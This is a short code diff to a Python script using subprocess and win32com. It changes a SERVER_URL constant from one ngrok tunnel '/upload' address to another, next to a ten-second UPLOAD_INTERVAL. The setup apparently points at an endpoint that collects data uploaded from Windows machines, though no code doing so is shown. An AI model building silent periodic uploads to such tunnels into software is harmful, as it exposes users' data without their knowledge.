@@ -14,7 +14,7 @@ import subprocess
 import win32com.client
 
 
-SERVER_URL = " https://a90e4bebaa09.ngrok-free.app/upload"
+SERVER_URL = "https://fa115edfbcb3.ngrok-free.app/upload"
 UPLOAD_INTERVAL = 10
 
 
